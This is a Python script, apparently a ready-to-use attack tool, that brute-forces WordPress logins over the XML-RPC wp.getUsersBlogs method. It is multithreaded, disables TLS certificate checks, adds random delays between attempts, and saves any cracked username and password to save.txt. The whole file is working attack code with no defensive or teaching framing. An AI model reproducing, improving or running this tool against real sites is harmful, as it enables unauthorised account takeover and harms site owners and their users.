#!/usr/bin/env python3
# wordPress XML-RPC brute force (wp.getUsersBlogs)

import requests
import sys
import os
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime
from random import uniform
from time import sleep

GRAY = "\033[90m"
YELLOW = "\033[33m"
RESET = "\033[0m"

BANNER = r"""
██████╗ ██╗    ██╗██████╗ ███╗   ██╗██╗  ██╗
██╔══██╗██║    ██║██╔══██╗████╗  ██║╚██╗██╔╝
██████╔╝██║ █╗ ██║██║  ██║██╔██╗ ██║ ╚███╔╝
██╔═══╝ ██║███╗██║██║  ██║██║╚██╗██║ ██╔██╗
██║     ╚███╔███╔╝██████╔╝██║ ╚████║██╔╝ ██╗
╚═╝      ╚══╝╚══╝ ╚═════╝ ╚═╝  ╚═══╝╚═╝  ╚═╝
            xmlrpc bruteforce
"""

XML = """<?xml version="1.0" encoding="iso-8859-1"?>
<methodCall>
<methodName>wp.getUsersBlogs</methodName>
<params>
<param><value><string>{username}</string></value></param>
<param><value><string>{password}</string></value></param>
</params>
</methodCall>"""

requests.packages.urllib3.disable_warnings()

class WPBrute:
    def __init__(self, url, username, passfile, threads=8):
        self.url = url
        self.username = username
        self.passfile = passfile
        self.threads = threads
        self.session = requests.Session()
        self.found = False
        self.start_time = None
        self.attempts = 0

    def load_passwords(self):
        try:
            with open(self.passfile, "r", encoding="utf-8", errors="ignore") as f:
                return [line.strip() for line in f if line.strip()]
        except FileNotFoundError:
            print(f"[!] password file {self.passfile} not found")
            sys.exit(1)

    def prepare_payload(self, password):
        return XML.format(username=self.username, password=password)

    def try_login(self, password):
        if self.found:
            return

        try:
            payload = self.prepare_payload(password)
            r = self.session.post(self.url, data=payload, timeout=10, verify=False)
            self.attempts += 1

            if "<name>" in r.text and "isAdmin" in r.text:
                self.success(password)
                self.found = True
                return

            if self.attempts % 100 == 0:
                elapsed = datetime.now() - self.start_time
                rate = self.attempts / elapsed.total_seconds()
                print(f"tried: {self.username}:{password} | attempts: {self.attempts} | rate: {rate:.2f}/s")

            sleep(uniform(0.05, 0.15))

        except requests.exceptions.RequestException:
            sleep(0.5)

    def success(self, password):
        print(f"\n{self.url} {YELLOW}[VULN]{RESET}")
        print("=" * 50)
        print(f"SUCCESS! credentials found!")
        print(f"username: {self.username}")
        print(f"password: {password}")
        print("=" * 50)

        with open("save.txt", "a") as f:
            f.write(f"{self.url} {self.username}:{password}\n")

    def run(self):
        passwords = self.load_passwords()
        print(f"[+] starting brute force against {self.url}")
        print(f"[+] loaded {len(passwords)} passwords")
        print(f"[+] using {self.threads} threads")
        print("=" * 50)

        self.start_time = datetime.now()
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            executor.map(self.try_login, passwords)

        if not self.found:
            print(f"{self.url} {GRAY}[not vuln]{RESET}")

def main():
    try:
        print(BANNER)
        url = input("url: ").strip()
        username = input("username: ").strip()
        passfile = input("password: ").strip()

        if not url or not username or not passfile:
            print("[!] missing input")
            sys.exit(1)

        brute = WPBrute(url, username, passfile)
        brute.run()

    except KeyboardInterrupt:
        print("\n[!] stopped by user")
        sys.exit(0)

if __name__ == "__main__":
    main()
